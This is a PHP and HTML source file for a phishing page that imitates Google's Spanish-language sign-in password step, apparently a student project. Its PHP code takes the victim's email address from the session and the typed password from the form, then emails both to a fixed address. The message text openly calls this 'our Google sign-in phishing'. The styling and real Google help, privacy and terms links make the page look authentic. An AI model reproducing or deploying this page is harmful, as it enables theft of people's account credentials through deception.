<?php
    session_start();
    $correo=$_SESSION['correo'];
    echo $correo;
    if (isset($_POST['olvido_contra'])){
        header('Location: error.php');
    }
    if (isset($_POST['siguiente'])){  // SUBIR LA PÁGINA A UN HOST PARA QUE FUNCIONE EL MAIL
        // tuto: https://www.youtube.com/watch?v=TtKPhnJDIL0
        $dest="david_hernandez_escribano@alumni.cristoreyva.com";
        $asunto="Cuenta Conseguida";
        $contra=$_POST['contrasena'];
        $mensaje="Cuenta registrada a través de nuestro Phishing de inicio de sesión de Google:
        
                Correo electrónico: $correo
                
                Contraseña: $contra
                ";
        
        $headers="MIME-Version: 1.0" . "\r\n";
        $headers .="Content-type:text/html;charset=UTF-8" . "\r\n";

        $headers .= 'From: David david10052004@gmail.com';
        $mail = @mail($dest, $asunto, $mensaje, $headers);
    }
?>
<html>
<head>
    <script src="http://code.jquery.com/jquery-1.9.1.js" type="text/javascript"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-u1OknCvxWvY5kfmNBILK2hRnQC3Pr17a+RTT6rIHI7NnikvbZlHgTPOOmMi466C8" crossorigin="anonymous">
    </script>
    <style>
        .columna {
            float: left;
            width: 50%;
        }
        .container2{
            position: absolute;
            top:86%;
            left:50%;
            transform: translate(-50%, -50%);
            padding: 20px;
            width: 65%;
            height: 20px;
        }
        .clear {
            clear: both;
        }
        .container {   
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            padding: 20px;
            background-color:#ffffff;
            border-radius: 30px;
            width: 65%;
            height: 60%;
        }
        .cuadro_texto_form {
            width: 100%;
            height: 60px;
            margin-top:20px;
            padding: 10px;
            margin-bottom:9px;
        }
        .input-field{
            position: relative;
        }
        .input-field input{
            width: 440px;
            height: 60px;
            border-radius: 6px;
            font-size: 18px;
            padding: 0 15px;
            border-color: gray;
            border: 1px groove gray;
            background: transparent;
            color: black;
            outline: none;
        }
        .input-field label{
            position: absolute;
            top: 50%;
            left: 15px;
            transform: translateY(-10%);
            color: gray;
            font-size: 19px;
            pointer-events: none;
            transition: .1s;
        }
        input:focus ~ label {
            top: 10px;
            left: 15px;
            font-size: 15px;
            padding: 0 2px;
            color: #0b57ce;
            background: #ffffff;
        }
        .input-field input:valid ~ label{
            top: 10px;
            left: 15px;
            font-size: 15px;
            padding: 0 2px;
            color: gray;
            background: #ffffff;
        }
        input:focus{
            border:2px solid #0b57ce;
            color:black;
        }
        
        .boton-siguiente {
            background-color: #0b57ce;
            color: #fff;
            border: none;
            border-radius: 20px;
            padding: 10px 20px;
            cursor: pointer;
            font-family:helvetica;
            font-weight:bold;
        }
        .boton-siguiente:hover{
            background-color:#0056b3;
        }
        .boton-olvido-contra{
            margin-left:60px;
            margin-top:120px;
            background-color:#ffffff;
            color: #0b57ce;
            border: none;
            border-radius: 20px;
            padding: 10px 20px;
            margin-right: 15px;
            cursor: pointer;
            font-family:helvetica;
            font-weight:bold;
        }
        .boton-olvido-contra:hover {
            background-color:#f0f3f8;
            color: #0b57ce;
            border: none;
            border-radius: 20px;
            padding: 10px 20px;
            cursor: pointer;      
        }
        .texto1{
            font-size:35;
            font-family:helvetica;
            font-weight:bold;
            padding-left:19px;
        }
        .texto2{
            font-family:helvetica;
            padding-left:20px;
        }
        .imagen{
            padding-left:15px;
        }
        .selector_idioma{               /* para aprender el css de los select: https://www.antofernandez.com/personalizar-un-select-con-css/ */
            background-color:#f0f3f8;
            border: none;
            width:180px;
            font-family:helvetica;
            font-size:13px;
            margin-top: 6px;
            margin-left: 0px;
            color:gray;
        } 
        .boton-ayuda{
            border:none;
            background-color:#f0f3f8;
            padding:10px 12px;
            color:gray;
            margin-left:200px;
        }
        .boton-ayuda:hover{
            background-color:#DFE1E6;
            border-radius:5px;
            padding:10px 12px;
            color:gray;
        }
        .boton-privacidad{
            border:none;
            background-color:#f0f3f8;
            padding:10px 12px;
            color:gray;
        }
        .boton-privacidad:hover{
            background-color:#DFE1E6;
            border-radius:5px;
            padding:10px 12px;
            color:gray;
        }
        .boton-terminos{
            border:none;
            background-color:#f0f3f8;
            padding:10px 12px;
            color:gray;
        }
        .boton-terminos:hover{
            background-color:#DFE1E6;
            border-radius:5px;
            padding:10px 12px;
            color:gray;
        }
        input[type="checkbox"] + label{
            padding-left: 15px;
            font-family: helvetica;
        }
    </style>
</head>
<body style="background-color:#f0f3f8">
    <?php
    ?>
    <div class="container">
        <div class="columna">
            <img src="gmail.JPG" class="imagen"><br>
            <p class="texto1">Inicia sesión</p>
            <p class="texto2">Utiliza tu cuenta de Google</p>
        </div>
        <div class="columna">
            <br><br><br><br>
            <form action="" method="post">
                <p style="font-family: helvetica">Debes verificar que eres tú para poder continuar</p>
                <div class="input-field">
                <input type="password" name="contrasena" id="contrasena" class="cuadro_texto_form" required>
                    <label for="contrasena">Introduce tu contraseña</label>
                </div>
                <input type="checkbox" class="mostrar-contra" id="checkbox1" onclick="mostrarContra()">
                <label for="checkbox1"> Mostrar contraseña</label> 
                <input type="button" name="olvido_contra" id="olvido-contra" value="¿Has olvidado tu contraseña?" class="boton-olvido-contra">
                <input type="submit" name="siguiente" value="Siguiente" class="boton-siguiente">
            </form>
            <script>
                function mostrarContra() {
                    var contraInput = document.getElementById("contrasena");
                    var checkBoton = document.querySelector(".mostrar-contra");
    
                    if (contraInput.type === "password") {
                        contraInput.type = "text";
                    } else {
                        contraInput.type = "password";
                        }
                    }
            </script>
            <script>
                document.getElementById("olvido-contra").addEventListener("click", function() {
                    window.location.href = "error.php";
                });
            </script>
        </div>
    </div>
    <div class="container2">
    <div class="columna">
    <form action="" method="post">
        <select name="opcion" class="selector_idioma" id="opcion">
            <option value="Afrikaans">Afrikaans</option>
            <option value="azerbaycan">azerbaycan</option>
            <option value="bosanski">bosanski</option>
            <option value="català">català</option>
            <option value="Čeština">Čeština</option>
            <option value="Cymraeg">Cymraeg</option>
            <option value="Dansk">Dansk</option>
            <option value="Deutsch">Deutsch</option>
            <option value="eesti">eesti</option>            
            <option value="English (United Kindom)">English (United Kindom)</option>
            <option value="English (United States)">English (United States)</option>
            <option value="Español (España)" selected>Español (España)</option>
            <option value="Español (Latinoamérica)">Español (Latinoamérica)</option>
            <option value="euskera">euskera</option>
            <option value="Filipino">Filipino</option>
            <option value="Français (Canada)">Français (Canada)</option>
            <option value="Français (France)">Français (France)</option>
            <option value="Gaeilge">Gaeilge</option>
            <option value="galego">galego</option>
            <option value="Hrvatski">Hrvatski</option>
            <option value="Indonesia">Indonesia</option>
            <option value="isiZulu">isiZulu</option>
            <option value="ílenska">ílenska</option>
            <option value="Italiano">Italiano</option>
            <option value="Kiswahili">Kiswahili</option>
            <option value="latviešu">latviešu</option>
            <option value="lietuvių">lietuvių</option>
            <option value="magyar">magyar</option>
            <option value="Melayu">Melayu</option>
            <option value="Nederlands">Nederlands</option>
            <option value="norsk">norsk</option>
            <option value="o'zbek">o'zbek</option>
            <option value="polski">polski</option>
            <option value="Português (Brasil)">Português (Brasil)</option>
            <option value="Português (Portugal)">Português (Portugal)</option>
            <option value="română">română</option>
            <option value="shqip">shqip</option>
            <option value="Slovenčina">Slovenčina</option>
            <option value="slovenščina">slovenščina</option>
            <option value="srpski (latinica)">srpski (latinica)</option>
            <option value="Suomi">Suomi</option>
            <option value="Svenska">Svenska</option>
            <option value="Tiếng Việt">Tiếng Việt</option>
            <option value="Türkçe">Türkçe</option>
            <option value="Ελληνικά">Ελληνικά</option>
            <option value="беларуская">беларуская</option>
            <option value="ქართული">ქართული</option>
        </select>
    </form>
    <script>
    document.getElementById("opcion").addEventListener("change", function() {
        if (this.value !== "Español (España)") {
            window.location.href = "error.php";
            this.value = "Español (España)";
        }
    });
</script>
    </div>
    <div class="columna">
    <button class="boton-ayuda" onclick="window.location.href = 'https://support.google.com/accounts?hl=es&visit_id=638479025336249153-439723689&rd=2&p=account_iph#topic=3382296';">Ayuda</button>
    <button class="boton-privacidad" onclick="window.location.href = 'https://policies.google.com/privacy?gl=ES&hl=es';">Privacidad</button> 
    <button class="boton-terminos" onclick="window.location.href = 'https://policies.google.com/terms?gl=ES&hl=es';">Términos</button>
    </div>
    </div>
</body>
</html>